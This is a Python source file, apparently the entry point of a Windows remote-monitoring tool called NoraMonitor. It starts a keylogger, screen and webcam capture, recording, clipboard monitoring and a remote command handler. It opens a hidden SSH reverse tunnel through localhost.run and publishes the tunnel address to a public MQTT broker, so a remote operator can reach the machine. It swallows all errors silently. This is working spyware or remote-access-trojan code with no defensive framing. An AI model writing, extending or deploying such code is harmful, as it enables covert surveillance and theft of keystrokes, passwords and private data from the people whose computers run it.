import os
import re
import json
import socket
import subprocess
import threading

MQTT_BROKER  = "broker.hivemq.com"
MQTT_TOPIC   = "nora/7638d08dcd8340ef953c"

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb

PORT = int(os.environ.get("NORA_PORT", 9090))

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
_CONFIG_FILE    = os.path.join(_APP_DIR, "config.json")

def _publish_url(pc_name, tunnel_url):
    try:
        import paho.mqtt.client as mqtt
        client = mqtt.Client()
        client.connect(MQTT_BROKER, 1883, 60)
        topic = f"{MQTT_TOPIC}/{pc_name.replace(' ', '_')}"
        client.publish(topic, tunnel_url, qos=1, retain=True)
        client.disconnect()
    except Exception:
        pass


def _start_tunnel(port):
    def _run():
        try:
            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ServerAliveInterval=30",
                "-o", "BatchMode=yes",
                "-R", f"80:localhost:{port}",
                "nokey@localhost.run"
            ]
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # SW_HIDE
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                startupinfo=si
            )
            for line in proc.stdout:
                m = re.search(r'https?://[a-z0-9-]{6,}\.(localhost\.run|lhr\.life)', line)
                if m:
                    tunnel_url = m.group(0)
                    import time; time.sleep(2)
                    server.broadcast_ngrok_url(tunnel_url)

                    pc_name = socket.gethostname()
                    threading.Thread(
                        target=_publish_url, args=(pc_name, tunnel_url), daemon=True
                    ).start()
                    break
            proc.wait()
        except Exception:
            pass
    threading.Thread(target=_run, daemon=True).start()


def main():
    os.makedirs(_APP_DIR, exist_ok=True)
    os.makedirs(_RECORDINGS_DIR, exist_ok=True)

    recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
    camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)

    server.init(controller.handle_command, recorder, camera)

    kl.Keylogger(server.broadcast_key).start()

    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
    capture.attach_recorder(recorder)
    capture.start()

    cb.ClipboardMonitor(server.broadcast_clipboard).start()

    threading.Thread(target=_start_tunnel, args=(PORT,), daemon=True).start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
